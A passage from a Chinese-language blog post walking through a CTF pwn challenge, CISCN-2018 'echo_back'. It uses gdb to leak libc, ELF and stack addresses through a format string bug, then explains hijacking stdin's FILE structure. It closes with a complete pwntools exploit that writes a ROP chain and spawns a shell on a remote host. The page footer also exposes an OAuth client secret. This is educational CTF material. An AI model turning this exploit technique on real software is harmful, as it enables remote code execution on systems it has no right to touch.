<p>说明此处存在格式化字符串漏洞</p>
<blockquote>
<p>if ( (nbytes &amp; 0x80000000) != 0LL || (signed int)nbytes &gt; 6 )<br>   LODWORD(nbytes) = 7;</p>
</blockquote>
<p>说明最多只能输入7个字符咯。</p>
<p>以及：</p>
<blockquote>
<p>printf(“length:”, 0LL);<br>_isoc99_scanf((<strong>int64)”%d”, (</strong>int64)&amp;nbytes);<br>getchar();</p>
</blockquote>
<p>并且注意到length的大小是通过 _isoc99_scanf 输入的。且后续还调用了getchar函数，这些函数的用法后续会讲到。<br>这也是我今天刚学会的知识点。</p>
<h2 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h2><p>1.PIE开启 ==&gt; 尝试泄露elf基址<br>2.泄露libc基址</p>
<p>首先由于echo_back存在格式化字符串漏洞，所以我们在运行程序时尝试去泄露一些数据。<br>我们gdb调试一下程序看栈上有无可以利用的地址。<br>首先切换至pwngdb调试工具，找到pie后的大致地址，发现elf的地址类似为 0x555555554xxx  ，最后三位就是各自的偏移了。<br>由IDA查看得libc_start_main函数的末尾：</p>
<blockquote>
<p>.text:0000000000000C6A                 leave<br>.text:0000000000000C6B                 retn</p>
</blockquote>
<p>所以得到leave的实际地址为0x555555554C6A<br>切换回gdb-peda，在leave这个地方下断点：<br>b *0x555555554C6A ，然后输入r运行程序。name输入“aaaaaa”，length输入“7”，数据随便，然后好像是自动截断了程序。<br>查看栈上内容。输入 stack 20  查看栈上20项数据</p>
<pre><code class="python">gdb-peda$ stack 20
0000| 0x7fffffffdd10 --&gt; 0x555555554ef8 --&gt; 0x74697865202e33 (&#39;3. exit&#39;)
0008| 0x7fffffffdd18 --&gt; 0x7fffffffdd60 --&gt; 0xa616161616161 (&#39;aaaaaa\n&#39;)
0016| 0x7fffffffdd20 --&gt; 0xa32 (&#39;2\n&#39;)
0024| 0x7fffffffdd28 --&gt; 0x70d170c00 
0032| 0x7fffffffdd30 --&gt; 0xa7024323125 (&#39;%12$p\n&#39;)
0040| 0x7fffffffdd38 --&gt; 0x403e35500d170c00 
0048| 0x7fffffffdd40 --&gt; 0x7fffffffdd70 --&gt; 0x555555554d30 (push   r15)
0056| 0x7fffffffdd48 --&gt; 0x555555554d08 (jmp    0x555555554d0b)
0064| 0x7fffffffdd50 --&gt; 0x555555554d30 (push   r15)
0072| 0x7fffffffdd58 --&gt; 0x200000001 
0080| 0x7fffffffdd60 --&gt; 0xa616161616161 (&#39;aaaaaa\n&#39;)
0088| 0x7fffffffdd68 --&gt; 0x403e35500d170c00 
0096| 0x7fffffffdd70 --&gt; 0x555555554d30 (push   r15)
0104| 0x7fffffffdd78 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:    mov    edi,eax)
0112| 0x7fffffffdd80 --&gt; 0x1 
0120| 0x7fffffffdd88 --&gt; 0x7fffffffde58 --&gt; 0x7fffffffe1d0 (&quot;/home/sixpar/desktop/ADWord-pwn/high/10.CISCN-2018-Quals  echo_back/echo_back&quot;)
0128| 0x7fffffffdd90 --&gt; 0x1f7ffcca0 
0136| 0x7fffffffdd98 --&gt; 0x555555554c6c (push   rbp)
0144| 0x7fffffffdda0 --&gt; 0x0 
0152| 0x7fffffffdda8 --&gt; 0x43e938916e459b29 </code></pre>
<p>发现了第15行：</p>
<blockquote>
<p>0096| 0x7fffffffdd78 –&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:    mov    edi,eax)</p>
</blockquote>
<p>可以看到0x7ffff7a2d830这个地址对应着 <strong>libc_start_main+240<br>这么说我们只要把这个地址泄露出来，然后减去固定偏移 240，那么我们就可以得到 __libc_start_main地址了。<br>那么这个地址怎么泄露呢？我们利用格式化字符串漏洞。<br>另开一个终端，运行程序，name随便输，在length处输入“7”，然后接着输入类似“%num$p”形式的数据来泄露地址。<br>我们发现当输入“%12$p”时才能泄露出一个地址，在12以前的都没用。<br>于是我们就从偏移12开始，偏移不断加一，试过去，最终在“%19$n”的时候泄露出0x7ffff7a2d830，即我们想要得到的地址（</strong>libc_start_main+240）</p>
<p>这么一来，libc的基址问题解决了，我们可以算出其他函数的地址：</p>
<pre><code class="python">libc_base = libc_s_m_addr - libc.symbols[&#39;__libc_start_main&#39;]
system = libc_base + libc.symbols[&#39;system&#39;]
bin_sh = libc_base + libc.search(&#39;/bin/sh&#39;).next()
IO_stdin_addr = libc_base + libc.symbols[&#39;_IO_2_1_stdin_&#39;]   # IO_2_1_stdin基址</code></pre>
<p>另外我们发现栈上第12行，即偏移为16（%16$p）的地方存储着我们输入的name内容。这个后面有用。</p>
<p>关于如何泄露ELF地址，很容易，应该只要是泄露0x555555554xxx形式的都可以。<br>所以我们选择了 %13$p 处的地址<br>输入“%13$p”，之后再用这个地址减去 0xd08 即可得到elf基址。</p>
<p>接下去我们想用格式化字符串漏洞修改main函数的返回地址,也就是修改%19$p处的数据。<br>但是我们要意识到，%19$n并不能达成我们的目标，因为%19$n是把%19$p的数据当成一个地址，然后往那个地址里写数据,也就是说，它会把 0x7ffff7a2d830  当成一个地址，然后往这个地址里写数据，而我们却希望是它往 0x7fffffffdd78  这个地址处写数据。<br>那么，我们首先得暴露出它的值（指的是0x7fffffffdd78），但是，栈里面也没有这个数据出现啊。然而，却有main函数的rbp数据。发现了宝藏。</p>
<p>发现栈上数据的第8行处：</p>
<blockquote>
<p>0048| 0x7fffffffdd40 –&gt; 0x7fffffffdd70 –&gt; 0x555555554d30 (push   r15)</p>
</blockquote>
<p>看到没有，存储着0x7fffffffdd70，那么我们泄露出这个地址后就可以 +8 得到 main函数的返回地址啦。这么说这个地址处的内容是 main的rbp咯。<br>这个地方偏移为12，所以“%12$p”就可以泄露啦。</p>
<p>好了，第一阶段泄露地址工作已经做完，接下去进入第二阶段。</p>
<p>接下来我们想构造payload，往main_ret处写数据，但是光一个p64(main_ret)就占了8个字符，而我们最多只被允许输入7个字符。<br>因此我们想到了setName功能，它不是白放那里的，它有着重要的作用。</p>
<p>它也可以接受7个字符，我们可以把main_ret存入a1中，虽然只允许7个字符，p64()有8字节，但由于是低位存储，也就是数据的前导0被舍弃，然而并不影响，除非那个数据8字节没有前导0。<br>我们之前就发现了的，%16$p输出的就是name的数据。<br>于是，我们就可以先setName(p64(addr))设立好靶子，然后利用%16$n来对addr处写数据（因为我们的输入是在偏移16）。<br>所以会把00写入到</p>
<p>然而，我们这样来直接写main_ret处的数据，还是不行，因为我们构造的payload始终长度都会大于7</p>
<p>于是，我们就需要用到一个新知识了，为了绕过7个字符的限制，我们换一个思路，我们利用格式化字符串漏洞先去攻击scanf内部结构，然后我们就可以直接利用scanf往目标处随意输入数据。<br>怎么随意输入数据呢？那就是修改IO_File结构体，令_IO_read_ptr == _IO_read_end，然后就可以向_IO_buf_base处写入读取的数据，并且输入的长度为 _IO_buf_end - _IO_buf_base</p>
<h3 id="IO-File结构体："><a href="#IO-File结构体：" class="headerlink" title="IO_File结构体："></a>IO_File结构体：</h3><p>结构体大致结构如下：（本题调试所得）</p>
<pre><code class="python">gdb-peda$ p _IO_2_1_stdin_
$2 = {
  file = {
    _flags = 0xfbad208b, 
    _IO_read_ptr = 0x7ffff7dd1964 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;, 
    _IO_read_end = 0x7ffff7dd1964 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;, 
    _IO_read_base = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;, 
    _IO_write_base = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;, 
    _IO_write_ptr = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;, 
    _IO_write_end = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;, 
    _IO_buf_base = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;, 
    _IO_buf_end = 0x7ffff7dd1964 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;, 
    _IO_save_base = 0x0, 
    _IO_backup_base = 0x0, 
    _IO_save_end = 0x0, 
    _markers = 0x0, 
    _chain = 0x0, 
    _fileno = 0x0, 
    _flags2 = 0x0, 
    _old_offset = 0xffffffffffffffff, 
    _cur_column = 0x0, 
    _vtable_offset = 0x0, 
    _shortbuf = &quot;\n&quot;, 
    _lock = 0x7ffff7dd3790 &lt;_IO_stdfile_0_lock&gt;, 
    _offset = 0xffffffffffffffff, 
    _codecvt = 0x0, 
    _wide_data = 0x7ffff7dd19c0 &lt;_IO_wide_data_0&gt;, 
    _freeres_list = 0x0, 
    _freeres_buf = 0x0, 
    __pad5 = 0x0, 
    _mode = 0xffffffff, 
    _unused2 = &#39;\000&#39; &lt;repeats 19 times&gt;
  }, 
  vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;
}</code></pre>
<p>关于 _IO_2_1_stdin_的地址，之前算出libc基址后就不难算出：0x7ffff7dd18e0<br>所以_IO_buf_base的地址就是 0x7ffff7dd18e0 + 0x8*7 = 0x7ffff7dd1918<br>前面有7个8字节的地址嘛，不难理解吧。</p>
<p>于是我们之前讲到的将 _IO_buf_base地址的低位覆盖为\x00，即变为0x7ffff7dd1900<br>这个地址又是哪里？</p>
<pre><code class="python">gdb-peda$ x/20xg 0x7ffff7dd1900
0x7ffff7dd1900 &lt;_IO_2_1_stdin_+32&gt;:    0x00007ffff7dd1963    0x00007ffff7dd1963
0x7ffff7dd1910 &lt;_IO_2_1_stdin_+48&gt;:    0x00007ffff7dd1963    0x00007ffff7dd1963</code></pre>
<p>可以看到0x7ffff7dd1900处是<em>IO_2_1_stdin</em>+32，即对应着_IO_write_base的地址。<br>如果理解不了，那就看：</p>
<pre><code class="python">gdb-peda$ x/20xg 0x7ffff7dd18e0
0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;:    0x00000000fbad208b    0x00007ffff7dd1964
0x7ffff7dd18f0 &lt;_IO_2_1_stdin_+16&gt;:    0x00007ffff7dd1964    0x00007ffff7dd1963
0x7ffff7dd1900 &lt;_IO_2_1_stdin_+32&gt;:    0x00007ffff7dd1963    0x00007ffff7dd1963</code></pre>
<p>你8个字节8个字节比对下来嘛，<em>IO_2_1_stdin</em>+32 （0x8*4）对应着_IO_write_base的地址，也就是结构体的第5个数据。</p>
<p>可见我们成功地打入到结构体内部去了。<br>现在，我们可以从0x7ffff7dd1900 （_IO_write_base）处向后输入，最好能把_IO_buf_base和_IO_buf_end都覆盖成关键地址，那么我们就能绕过7个字符的输入限制。最终能输入字符的大小取决于_IO_buf_end-_IO_buf_base了。</p>
<p>之后还有一个检测需要绕过，<br>更详细的解释我都写在exp里了。现在是晚上23:44，我困了，为了明天有精神早起，我准备收工了，太累了。</p>
<h2 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h2><pre><code class="python">#! /usr/bin/env python
#coding:utf8
from pwn import *

local = 0
if local:
    p = process(&#39;./echo_back&#39;)
else:
    p = remote(&quot;220.249.52.133&quot;, 32255)

debug = 0
if debug:
    context.log_level = &#39;debug&#39;

elf = ELF(&#39;./echo_back&#39;)
libc = ELF(&#39;./libc.so.6&#39;)
prdi = 0x0000000000000d93   #pop_rdi_ret
main_P_addr = 0xc6c  #main_start
IO_stdin = libc.symbols[&#39;_IO_2_1_stdin_&#39;]
# context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
# gdb.attach(p)

def echo_back(size, con):
    p.sendlineafter(&#39;choice&gt;&gt; &#39;, &#39;2&#39;)
    p.sendlineafter(&#39;length:&#39;, str(size))
    p.send(con)

def name(name):
    p.sendlineafter(&#39;choice&gt;&gt; &#39;, &#39;1&#39;)
    p.sendafter(&#39;name:&#39;, name)

# 泄露libc基址
echo_back(7, &#39;%19$p&#39;)
p.recvuntil(&#39;0x&#39;)
libc_s_m_addr = int(p.recvuntil(&#39;-&#39;).split(&#39;-&#39;)[0], 16) - 0xF0
print &quot;libc_start_main :&quot;+hex(libc_s_m_addr)
libc_base = libc_s_m_addr - libc.symbols[&#39;__libc_start_main&#39;]
system = libc_base + libc.symbols[&#39;system&#39;]
bin_sh = libc_base + libc.search(&#39;/bin/sh&#39;).next()
IO_stdin_addr = libc_base + IO_stdin   # IO_stdin 的基址


# 泄露elf基址
echo_back(7, &#39;%13$p&#39;)
p.recvuntil(&#39;0x&#39;)
elf_base = int(p.recvuntil(&#39;-&#39;, drop=True), 16) - 0xd08
prdi = prdi + elf_base

# 泄露main返回地址
echo_back(7, &#39;%12$p&#39;)
p.recvuntil(&#39;0x&#39;)
main_ebp = int(p.recvuntil(&#39;-&#39;, drop=True), 16)
print &quot;main_rbp&quot;+hex(main_ebp)
main_ret = main_ebp + 0x8
print &quot;main_ret&quot;+hex(main_ret)

# 修改IO_buf_base，增大输入字符数
# gdb-peda$ p _IO_2_1_stdin_
# $2 = {
#   file = {
#     _flags = 0xfbad208b, 
#     _IO_read_ptr = 0x7ffff7dd1964 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;, 
#     _IO_read_end = 0x7ffff7dd1964 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;, 
#     _IO_read_base = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;, 
#     _IO_write_base = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,  &lt;----IO_stdin+0x8*4
#     _IO_write_ptr = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;, 
#     _IO_write_end = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;, 
#     _IO_buf_base = 0x7ffff7dd1963 &lt;_IO_2_1_stdin_+131&gt; &quot;\n&quot;,    &lt;----IO_stdin+0x8*7
#     _IO_buf_end = 0x7ffff7dd1964 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;, 

# 可见IO_buf_base距离 _IO_2_1_stdin_ （基址） 之间有 0x8 *7 的大小
IO_buf_base = IO_stdin_addr + 0x8 * 7
print &quot;IO_buf_base:&quot;+hex(IO_buf_base)
name(p64(IO_buf_base))  #设好靶子,便于打靶
echo_back(7, &#39;%16$hhn&#39;) #因为我们的name输入位于偏移16上。
#所以就把\x00写入IO_buf_base地址的低1字节。


#若IO_2_1_stdin地址为0x7f84cf1228e0，
#则IO_buf_base地址为0x7f84cf122918   (IO_2_1_stdin地址+0x8*7)
#现在把IO_buf_base地址低位覆盖为00,所以就成了 0x7f84cf122900
#这个地址在哪呢？
# x/10xg 0x7f84cf122900  
#得到的是 &lt;_IO_2_1_stdin_+32&gt; ,也就是 _IO_2_1_stdin_地址 + 0x8*4 ,
#我们比对上方的结构体发现刚好是 _IO_write_base的地址。


# 输入的payload将输入到 _IO_write_base 处
# 从_IO_write_base 开始，覆盖stdinFILE结构的关键参数
payload = p64(IO_stdin_addr + 0x83) * 3 + p64(main_ret) + p64(main_ret + 3 * 0x8)
#payload改写后，数据如下：
#     _IO_write_base = 0x7f84cf122963  (IO_stdin_addr + 0x83)
#     _IO_write_ptr = 0x7f84cf122963
#     _IO_write_end = 0x7f84cf122963
#     _IO_buf_base = main_ret
#     _IO_buf_end = main_ret+0x8*3

#这么改写后， IO_buf_end - IO_buf_base = 0x8*3
#根据规则将可以写入0x8*3字节的数据
#即我们之后需要输入的3个8字节的ROP链的内容
p.sendlineafter(&#39;choice&gt;&gt; &#39;, &#39;2&#39;)
p.sendafter(&#39;length:&#39;, payload)  
#再读取lengrh的时候程序调用的是_isoc99_scanf函数
#而scanf与IO_file 有内在的联系
#我也不知道，反正通过scanf输入的字符串将写入_IO_2_1_stdin_内部
p.sendline(&#39;&#39;)

#但要想写入，前提是绕过_IO_new_file_underflow中的检测
# 检测： if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end) return *(unsigned char *) fp-&gt;_IO_read_ptr;
#如果输入缓冲区里存在数据，则直接返回，
#我们为了不让其返回，所以这里需要令 read_ptr &gt;= read_end

#但问题是read_end的值会增大！ 原因如下：
##调用_IO_SYSREAD函数最终执行系统调用读取数据
#   count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,
#                fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);
#   ...
#   ## 设置结构体指针
#   fp-&gt;_IO_read_end += count;
#count是我们输入的payload的长度，可见_IO_read_end 最终会加上 count，所以值会变大。

#而我们又想让 read_ptr &gt;= read_end ,
# 那如何也使得read_ptr的值变大呢？？

#我们发现，
#程序在调用_isoc99_scanf函数之后又有getchar函数，
#而getchar函数的特性：每调用一次getchar，_IO_read_ptr 加 1
#故我们可以反复调用getchar()函数, 最终让fp-&gt;_IO_read_ptr == fp-&gt;_IO_read_end
for i in range(0,len(payload) - 1):
    p.sendlineafter(&#39;choice&gt;&gt; &#39;, &#39;2&#39;)
    p.sendlineafter(&#39;length:&#39;, &#39;0&#39;)

# 实现指定位置写
p.sendlineafter(&#39;choice&gt;&gt; &#39;, &#39;2&#39;)
p.sendlineafter(&#39;length:&#39;, p64(prdi) + p64(bin_sh) + p64(system))
#我很好奇它这个3×0x8 字节的数据是写到哪里去啦？
#根据以上情况的综合，我猜测是写到 main返回地址那里去了，然后刚好把main的返回地址覆盖为prdi地址。
#即，这样？
# main：    pop rdi
# main+0x8: binsh_addr
# main+0x10:system_addr

p.sendline(&#39;&#39;)
# getshell
p.sendlineafter(&#39;choice&gt;&gt; &#39;, &#39;3&#39;) # exit函数，退出main函数，所以执行main的返回地址。
p.interactive()
</code></pre>
<h2 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h2><p>我对 IO_File 类题目本来不熟悉，但是现在我大致上能够了解了。<br>睡了睡了。晚安 (¦3[▓▓] </p>

      
       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论嗷。 </span>
    </div>
</article>


<p>
    <a  class="dashang" onclick="dashangToggle()">💰</a>
</p>




    <div id="comments"></div>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">

<script type="text/javascript">
    $.getScript('/js/gitalk.js', function () {
        var gitalk = new Gitalk({
            clientID: '1ce498b97d2ce45eead3',
            clientSecret: 'b9ceb4618f0ef4fa4abe92ef21a5c7d2b2fbc9cb',
            repo: 'ccjacoo.github.io',
            owner: 'ccjacoo',
            admin: ['ccjacoo'],
            id: decodeURI(location.pathname),
            distractionFreeMode: 'true',
            language: 'zh-CN',
            perPage: parseInt('10',10)
        })
        gitalk.render('comments')
    })
</script>




    




    </div>
    <div class="copyright">
        <p class="footer-entry">
    ©2020 sixpar
</p>
<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
<a class="" id="rocket" ></a>

    </div>
</div>

<div class="hide_box" onclick="dashangToggle()"></div>
<div class="shang_box">
    <a class="shang_close"  onclick="dashangToggle()">×</a>
    <div class="shang_tit">
        <p>Help us with donation</p>
    </div>
    <div class="shang_payimg">
        <div class="pay_img">
            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
        </div>
    </div>
    <div class="shang_payselect">
        <span><label><input type="radio" name="pay" checked value="alipay">alipay</label></span><span><label><input type="radio" name="pay" value="weixin">weixin</label></span>
    </div>
</div>


</body>
<script src="/js/jquery.pjax.js?v=1.1.0" ></script>

<script src="/js/script.js?v=1.1.0" ></script>
<script>
    var img_resize = 'default';
    function initArticle() {
        /*渲染对应的表格样式*/
        
            $("#post .pjax table").addClass("green_title");
        

        /*渲染打赏样式*/
        
        $("input[name=pay]").on("click", function () {
            if($("input[name=pay]:checked").val()=="weixin"){
                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
            } else {
                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
            }
        })
        

        /*高亮代码块行号*/
        
        $('pre code').each(function(){
            var lines = $(this).text().trim().split('\n').length, widther='';
            if (lines>99) {
                widther = 'widther'
            }
            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
            $(this).addClass('has-numbering ' + widther)
                    .parent()
                    .append($numbering);
            for(var i=1;i<=lines;i++){
                $numbering.append($('<li/>').text(i));
            }
        });
        

        /*访问数量*/
        
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
        

        /*代码高亮，行号对齐*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));

        
        
    }

    /*打赏页面隐藏与展示*/
    
    function dashangToggle() {
        $(".shang_box").fadeToggle();
        $(".hide_box").fadeToggle();
    }
    

</script>

<!--加入行号的高亮代码块样式-->

<style>
    pre{
        position: relative;
        margin-bottom: 24px;
        border-radius: 10px;
        border: 1px solid #e2dede;
        background: #FFF;
        overflow: hidden;
    }
    code.has-numbering{
        margin-left: 30px;
    }
    code.has-numbering.widther{
        margin-left: 35px;
    }
    .pre-numbering{
        margin: 0;
        position: absolute;
        top: 0;
        left: 0;
        width: 20px;
        padding: 0.5em 3px 0.7em 5px;
        border-right: 1px solid #C3CCD0;
        text-align: right;
        color: #AAA;
        background-color: ;
    }
    .pre-numbering.widther {
        width: 35px;
    }
</style>

<!--自定义样式设置-->
<style>
    
    
    .nav {
        width: 542px;
    }
    .nav.fullscreen {
        margin-left: -542px;
    }
    .nav-left {
        width: 120px;
    }
    
    
    @media screen and (max-width: 1468px) {
        .nav {
            width: 492px;
        }
        .nav.fullscreen {
            margin-left: -492px;
        }
        .nav-left {
            width: 100px;
        }
    }
    
    
    @media screen and (max-width: 1024px) {
        .nav {
            width: 492px;
            margin-left: -492px
        }
        .nav.fullscreen {
            margin-left: 0;
        }
    }
    
    @media screen and (max-width: 426px) {
        .nav {
            width: 100%;
        }
        .nav-left {
            width: 100%;
        }
    }
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #ECEAEA;
    }
    
    

    /*列表样式*/
    

    /* 背景图样式 */
    
    


    /*引用块样式*/
    

    /*文章列表背景图*/
    
    .nav-right:before {
        content: ' ';
        display: block;
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        opacity: 0.5;
        background: url("https://i.loli.net/2020/07/04/kPifeO4vhSjdqE5.jpg");
        background-repeat: no-repeat;
        background-position: 50% 0;
        -ms-background-size: cover;
        -o-background-size: cover;
        -moz-background-size: cover;
        -webkit-background-size: cover;
        background-size: cover;
    }
    

    
</style>







</html>
